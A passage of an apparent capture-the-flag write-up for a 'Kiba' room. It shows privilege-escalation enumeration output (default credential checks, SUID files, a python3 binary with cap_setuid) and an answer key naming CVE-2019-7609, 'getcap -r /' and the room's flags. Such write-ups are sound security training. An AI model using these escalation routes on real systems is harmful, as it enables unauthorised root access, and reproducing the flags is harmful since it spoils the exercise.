reboot   system boot  4.4.0-176-generi Tue Mar 31 22:18 - 23:05  (00:47)
kiba     pts/0        192.168.85.1     Tue Mar 31 22:04 - 22:18  (00:13)
reboot   system boot  4.4.0-176-generi Tue Mar 31 22:04 - 23:05  (01:01)
kiba     pts/0        192.168.85.1     Tue Mar 31 17:16 - 22:03  (04:47)
reboot   system boot  4.4.0-176-generi Tue Mar 31 17:16 - 22:03  (04:47)
kiba     tty1                          Tue Mar 31 16:42 - crash  (00:33)
reboot   system boot  4.4.0-142-generi Tue Mar 31 10:41 - 22:03  (11:22)

wtmp begins Tue Mar 31 10:41:18 2020

[+] Last time logon each user
Username         Port     From             Latest
kiba             pts/0    192.168.85.1     Tue Mar 31 22:41:40 -0700 2020

[+] Password policy
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


===================================( Software Information )===================================
[+] MySQL version
mysql Not Found

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No
[+] MySQL connection using root/NOPASS ................. No
[+] Searching mysql credentials and exec
 Not Found

[+] PostgreSQL version and pgadmin credentials
 Not Found

[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No

[+] Apache server info
Version: Server version: Apache/2.4.18 (Ubuntu)
Server built:   2019-10-08T13:31:25
PHP exec extensions

[+] Searching PHPCookies
 Not Found

[+] Searching Wordpress wp-config.php files
wp-config.php Not Found

[+] Searching Drupal settings.php files
/default/settings.php Not Found

[+] Searching Tomcat users file
tomcat-users.xml Not Found

[+] Mongo information
 Not Found

[+] Searching supervisord configuration file
supervisord.conf Not Found

[+] Searching cesi configuration file
cesi.conf Not Found

[+] Searching Rsyncd config file
/usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
	comment = public archive
	path = /var/www/pub
	use chroot = yes
	lock file = /var/lock/rsyncd
	read only = yes
	list = yes
	uid = nobody
	gid = nogroup
	strict modes = yes
	ignore errors = no
	ignore nonreadable = yes
	transfer logging = no
	timeout = 600
	refuse options = checksum dry-run
	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

[+] Searching Hostapd config file
hostapd.conf Not Found

[+] Searching wifi conns file
 Not Found

[+] Searching Anaconda-ks config files
anaconda-ks.cfg Not Found

[+] Searching .vnc directories and their passwd files
.vnc Not Found

[+] Searching ldap directories and their hashes
/etc/ldap
The password hash is from the {SSHA} to 'structural'

[+] Searching .ovpn files and credentials
.ovpn Not Found

[+] Searching ssl/ssh files
Port 22
PermitRootLogin prohibit-password
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
 --> /etc/hosts.allow file found, read the rules:



Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

[+] Searching unexpected auth lines in /etc/pam.d/sshd
No

[+] Searching Cloud credentials (AWS, Azure, GC)

[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
/etc/exports Not Found

[+] Searching kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
krb5.conf Not Found
tickets kerberos Not Found
klist Not Found

[+] Searching Kibana yaml
/home/kiba/kibana/config/kibana.yml
server.host: "0.0.0.0"

[+] Searching Knock configuration
Knock.config Not Found

[+] Searching logstash files
...

[+] Searching elasticsearch files
 Not Found

[+] Searching Vault-ssh files
vault-ssh-helper.hcl Not Found

[+] Searching AD cached hashes
cached hashes Not Found

[+] Searching screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
screen Not Found

[+] Searching tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
tmux Not Found

[+] Searching Couchdb directory

[+] Searching redis.conf

[+] Searching dovecot files
dovecot credentials Not Found

[+] Searching mosquitto.conf

[+] Searching neo4j auth file

[+] Searching Cloud-Init conf file

[+] Searching Erlang cookie file

[+] Searching GVM auth file

[+] Searching IPSEC files


====================================( Interesting Files )=====================================
[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chfn		--->	SuSE_9.3/10
/usr/bin/newgrp		--->	HP-UX_10.20
/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/usr/bin/sudo		--->	/sudo$
/usr/bin/chsh
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/bin/ping
/bin/umount		--->	BSD/Linux(08-1996)
/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/bin/ping6
/bin/su
/bin/fusermount

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/usr/bin/ssh-agent
/usr/bin/chage
/usr/bin/expiry
/usr/bin/bsd-write
/usr/bin/crontab
/usr/bin/mlocate
/usr/bin/wall
/sbin/unix_chkpwd
/sbin/pam_extrausers_chkpwd

[+] Writable folders configured in /etc/ld.so.conf.d/
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#etc-ld-so-conf-d
/usr/local/lib
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu/mesa-egl
/usr/lib/x86_64-linux-gnu/mesa

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep

[+] Users with capabilities
/etc/security/capability.conf Not Found

[+] Files with ACLs
files with acls in searched folders Not Found

[+] .sh files in path
/usr/bin/gettext.sh
/usr/bin/metricbeat.sh

[+] Unexpected folders in root

[+] Files (scripts) in /etc/profile.d/
total 16
drwxr-xr-x  2 root root 4096 Mar 31  2020 .
drwxr-xr-x 95 root root 4096 Jul 23  2020 ..
-rw-r--r--  1 root root  663 May 18  2016 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

[+] Hashes inside passwd file? ........... No
[+] Hashes inside group file? ............ No
[+] Credentials in fstab/mtab? ........... No
[+] Can I read shadow files? ............. No
[+] Can I read root folder? .............. No

[+] Searching root files in home dirs (limit 20)
/home
/home/kiba/.hackmeplease/python3
/home/kiba/.wget-hsts

[+] Searching others files in folders owned by me
....

```

<br><br>



<br>

THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}<br>

![image](https://github.com/user-attachments/assets/9e44fec0-bb39-4334-84dc-57a89eb97295)




<br>
<br>
<h2 align="center">Task 1. Flags<a id='1'></a></h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 1.1. <em>What is the vulnerability that is specific to programming languages with prototype-based inheritance?</em><br><a id='1.1'></a>
>> <code><strong>Prototype pollution</strong></code>

<br>

> 1.2. <em>What is the version of visualization dashboard installed in the server?</em><br><a id='1.2'></a>
>> <code><strong>6.5.4</strong></code>

<br>

> 1.3. <em>What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000</em><br><a id='1.3'></a>
>> <code><strong>CVE-2019-7609</strong></code>

<br>

> 1.4. <em>Compromise the machine and locate user.txt</em><br><a id='1.4'></a>
>> <code><strong>THM{1s_easy_pwn3d_k1bana_w1th_rce}</strong></code>

<br>

> 1.5. <em>Capabilities is a concept that provides a security system that allows "divide" root privileges into different values</em><br><a id='1.5'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 1.6. <em>How would you recursively list all of these capabilities?</em><br><a id='1.5'></a>
>> <code><strong>getcap -r /</strong></code>

<br>

> 1.7. <em>Escalate privileges and obtain root.txt</em><br><a id='1.6'></a>
>> <code><strong>THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}<br></strong></code>

<br>




![image](https://github.com/user-attachments/assets/2ecf8920-7f7f-4704-8300-9e1d4473c170)

<br>

![image](https://github.com/user-attachments/assets/a9e7e443-b292-4e82-80a7-8353fde25c4a)


<br>

![image](https://github.com/user-attachments/assets/752cbb57-5523-4832-95ef-fb16c20cf0c1)

<br><br><br>

![image](https://github.com/user-attachments/assets/c2a4e1aa-e20d-4851-b4a9-989d38d83ae6)


<br>

![image](https://github.com/user-attachments/assets/93fdcaa9-7ebf-4438-86b8-1a89136de91f)

<br>

![image](https://github.com/user-attachments/assets/22783291-4002-461d-9a5b-1ecaf57e6b03)

<br>


![image](https://github.com/user-attachments/assets/475a8ac0-d251-4f48-8cbb-6256ff776eef)











